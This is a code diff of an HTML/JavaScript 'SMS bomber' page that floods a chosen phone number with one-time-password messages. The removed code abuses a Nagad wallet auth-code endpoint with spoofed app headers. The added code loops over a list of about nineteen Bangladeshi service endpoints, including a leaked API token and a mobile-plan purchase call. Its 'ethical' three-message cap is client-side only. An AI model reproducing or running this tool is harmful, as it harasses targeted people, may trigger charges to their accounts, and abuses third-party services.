@@ -3,148 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bomber Tool</title>
+    <title>RNASAKS BOMBER</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
+            background-color: #1e1e2f;
+            color: #f8f8f8;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #f0f0f0;
+            margin: 0;
         }
+
         .container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
         }
+
+        #ascii-art {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
         label {
-            display: block;
-            margin-bottom: 8px;
+            margin: 10px 0 5px;
+            font-weight: bold;
         }
+
         input {
-            width: 100%;
-            padding: 8px;
-            margin-bottom: 16px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #007bff;
-            color: #fff;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
             border: none;
-            border-radius: 4px;
+            width: 80%;
+            max-width: 400px;
+        }
+
+        button {
+            background-color: #4caf50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
             cursor: pointer;
+            font-size: 1rem;
         }
+
         button:hover {
-            background-color: #0056b3;
+            background-color: #45a049;
         }
-        pre {
-            text-align: left;
-            white-space: pre-wrap;
+
+        #output {
+            margin-top: 20px;
+            color: #f8f8f8;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Bomber Tool</h1>
-        <form id="bomberForm">
-            <label for="num">Enter Number:</label>
-            <input type="text" id="num" name="num" required>
-            <label for="amt">Enter Limit:</label>
-            <input type="number" id="amt" name="amt" required>
-            <button type="submit">Start</button>
+        <h1 id="ascii-art">RNASAKS BOMBER</h1>
+        <form id="otp-form">
+            <label for="phone-number">Phone Number (with country code):</label>
+            <input type="text" id="phone-number" name="phone-number" placeholder="+8801234567890" required>
+            
+            <label for="otp-limit">Number of OTP messages to send (maximum 3):</label>
+            <input type="number" id="otp-limit" name="otp-limit" min="1" max="3" required>
+            
+            <button type="submit">Send OTP</button>
         </form>
-        <pre id="result"></pre>
+        <div id="output"></div>
     </div>
     <script>
-        document.getElementById('bomberForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+        (function() {
+            async function sendOtp(apiData, phoneNumber, limit) {
+                let successCount = 0;
+                let failureCount = 0;
+                let results = [];
 
-            const num = document.getElementById('num').value;
-            const amt = parseInt(document.getElementById('amt').value, 10);
+                for (let i = 0; i < limit; i++) {
+                    for (const api of apiData) {
+                        const url = api.url.replace("{phone_number}", phoneNumber);
+                        const body = api.body.replace("{phone_number}", phoneNumber);
 
-            if (isNaN(amt)) {
-                displayResult({ error: "Invalid 'amt' parameter." });
-                return;
+                        try {
+                            const response = await fetch(url, {
+                                method: api.method.toUpperCase(),
+                                headers: api.headers,
+                                body: api.method.toLowerCase() === "post" ? body : undefined
+                            });
+
+                            if (response.ok) {
+                                successCount++;
+                                results.push(`Success via ${api.name}`);
+                                console.log(`OTP sent successfully via ${api.name}.`);
+                            } else {
+                                failureCount++;
+                                results.push(`Failed via ${api.name} - Status: ${response.status}`);
+                                console.log(`Failed to send OTP via ${api.name}. Status: ${response.status}`);
+                            }
+                        } catch (error) {
+                            failureCount++;
+                            results.push(`Error via ${api.name} - ${error.message}`);
+                            console.error(`Error sending OTP via ${api.name}: ${error}`);
+                        }
+                    }
+                }
+
+                // Update output
+                const outputDiv = document.getElementById('output');
+                outputDiv.innerHTML = `
+                    OTP sending complete.<br>
+                    Success: ${successCount}, Failures: ${failureCount}.<br>
+                    Details: <br>${results.join('<br>')}
+                `;
             }
 
-            startBomber(num, amt);
-        });
+            document.getElementById('otp-form').addEventListener('submit', function(event) {
+                event.preventDefault();
 
-        function startBomber(num, amt) {
-            const urlCheck = `https://app.mynagad.com:20002/api/user/check-user-status-for-log-in?msisdn=${num}`;
-            const urlBomb = "https://app.mynagad.com:20002/api/wallet/generateAuthCode/deviceChange";
+                const phoneNumber = document.getElementById('phone-number').value;
+                let limit = parseInt(document.getElementById('otp-limit').value);
 
-            fetch(urlCheck, {
-                method: 'GET',
-                headers: contHeda()
-            })
-            .then(response => response.json())
-            .then(status => {
-                if (status.status === "ACTIVE") {
-                    const uid = status.userId;
-                    let successes = 0;
-                    let failures = 0;
-
-                    for (let i = 0; i < amt; i++) {
-                        fetch(urlBomb, {
-                            method: 'POST',
-                            headers: contHeda({ 'Content-Type': 'application/json; charset=UTF-8' }),
-                            body: JSON.stringify({ userId: uid })
-                        })
-                        .then(response => response.json())
-                        .then(result => {
-                            if (result.executionStatus && result.executionStatus.statusType === "EXECUTED_SUCCESS") {
-                                successes++;
-                            } else {
-                                failures++;
-                            }
-
-                            if (i === amt - 1) {
-                                displayResult({
-                                    Status: `success - ${successes} & fail - ${failures}`,
-                                    num: num,
-                                    amt: amt,
-                                    Credit: "TEAM DCCS"
-                                });
-                            }
-                        })
-                        .catch(() => failures++);
-                    }
-                } else {
-                    displayResult({ error: "NaGad account is not active." });
+                // Ethical constraint
+                if (limit > 3) {
+                    limit = 3;
+                    alert("Limit exceeds ethical bounds. Restricting to 3 messages.");
                 }
-            })
-            .catch(() => displayResult({ error: "Failed to check user status." }));
-        }
 
-        function contHeda(extraHeaders = {}) {
-            return {
-                'User-Agent': 'okhttp/3.14.9',
-                'Connection': 'Keep-Alive',
-                'Accept-Encoding': 'gzip',
-                'X-KM-UserId': 'None',
-                'X-KM-User-AspId': '100012345612345',
-                'X-KM-User-Agent': 'ANDROID/1152',
-                'X-KM-DEVICE-FGP': generateDeviceFgp(),
-                'X-KM-Accept-language': 'bn',
-                'X-KM-AppCode': '01',
-                ...extraHeaders
-            };
-        }
+                // Displaying output
+                const outputDiv = document.getElementById('output');
+                outputDiv.innerHTML = "Sending OTPs...";
 
-        function generateDeviceFgp() {
-            const chars = '0123456789ABCDEF';
-            return Array.from({ length: 32 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
-        }
+                const apiList = [
+                {"id":"1","name":"GP","url":"https://api.mygp.cinematic.mobi/api/v1/otp/{phone_number}/SBENT_3GB7D","method":"post","body":"","headers":{"content-type":"application/json"}},
+                    {"id":"2","name":"Tap","url":"https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp","method":"post","body":"{\"deviceId\":\"7dtdhid45c0f5678\",\"deviceInfo\":{\"deviceInfoSignature\":\"D0923F3GDHJXJDTIHFDTIGGHURHFATGHIYAGTAJ\",\"deviceId\":\"7d8b0agi0g0f0568\",\"firebaseDeviceToken\":\"\",\"manufacturer\":\"MI\",\"modelName\":\"NOTE 10\",\"osFirmWireBuild\":\"\",\"osName\":\"Android\",\"osVersion\":\"10\",\"rootDevice\":0},\"operator\":\"Gp\",\"walletNumber\":\"{phone_number}\"}","headers":{"content-type":"application/json"}},
+                    {"id":"3","name":"GP","url":"https://weblogin.grameenphone.com/backend/api/v1/otp","method":"post","body":"{\"msisdn\":\"{phone_number}\"}","headers":{"content-type":"application/json"}},
+                    {"id":"4","name":"Arogga","url":"https://api.arogga.com/v1/auth/sms/send","method":"post","body":"mobile=%2B88{phone_number}&fcmToken=&referral=","headers":{"content-type":"application/x-www-form-urlencoded"}},
+                    {"id":"5","name":"Gp Flexi Plan","url":"https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation","method":"post","body":"{\"payment_mode\":\"mobile_balance\",\"longevity\":7,\"voice\":25,\"data\":1536,\"fourg\":0,\"bioscope\":0,\"sms\":0,\"mca\":0,\"msisdn\":\"{phone_number}\",\"price\":93.52,\"bundle_id\":17130,\"is_login\":false}","headers":{"content-type":"application/json"}},
+                    {"id":"6","name":"Ecuriar","url":"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone_number}","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+                    {"id":"7","name":"Chaina","url":"https://chinaonlineapi.com/api/v1/get/otp?phone={phone_number}","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded","token":"gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219"}},
+                    {"id":"8","name":"Iqra","url":"http://apibeta.iqra-live.com/api/v1/sent-otp/{phone_number}","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+                    {"id":"18","name":"Sikho","url":"https://api.shikho.com/auth/v2/send/sms","method":"post","body":"{\"phone\":\"{phone_number}\",\"type\":\"student\",\"auth_type\":\"signup\",\"vendor\":\"shikho\"}","headers":{"content-type":"application/json"}},
+                    {"id":"9","name":"Qcom","url":"https://auth.qcoom.com/api/v1/otp/send","method":"post","body":"{\"mobileNumber\":\"{phone_number}\"}","headers":{"content-type":"application/json","Referer":"https://qcoom.com"}},
+                    {"id":"10","name":"Circel","url":"https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn={phone_number}","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+                    {"id":"11","name":"Cinespot","url":"http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-{phone_number}/operator-Robi/send","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+                    {"id":"12","name":"Dhaka","url":"https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber","method":"post","body":"{ \"AccessToken\": \"\", \"TrackingNo\": \"\", \"mobileNo\": \"{phone_number}\", \"otpSms\": \"\", \"product_id\": \"250\", \"requestChannel\": \"MOB\", \"trackingStatus\": 5 }","headers":{"content-type":"application/json"}},
+                    {"id":"13","name":"Applink","url":"https://candidappstore.page.link/?link=https://applink.viber.com/viber&apn=com.viber.voip&afl=https://applink.viber.com/viber","method":"post","body":"","headers":{"content-type":"application/json"}},
+                    {"id":"14","name":"Matrix","url":"https://matrix-cbtest.wnscode.com/backend/api/v1/auth/otp?mobileNumber={phone_number}&country_code=880","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+                    {"id":"15","name":"Coders","url":"https://api.codersathi.com/api/otp/generate?phone={phone_number}","method":"get","body":"","headers":{"content-type":"application/json"}},
+                    {"id":"16","name":"Jujube","url":"http://jujubegp.bdapi.dev:8000/3f6a236k-g63e-4d56-9d59-8b40m25fa91c/otp-generate","method":"get","body":"","headers":{"content-type":"application/json"}},
+                    {"id":"17","name":"Nagad","url":"https://api.mynagad.com:444/api/otp_generate/?mobile={phone_number}","method":"post","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
+                    {"id":"19","name":"Rehla","url":"https://app.rehla.com.bd/api/v1/sendotp/{phone_number}","method":"get","body":"","headers":{"content-type":"application/json"}}
+                ];
 
-        function displayResult(result) {
-            document.getElementById('result').textContent = JSON.stringify(result, null, 4);
-        }
+                sendOtp(apiList, phoneNumber, limit);
+            });
+        })();
     </script>
 </body>
 </html>
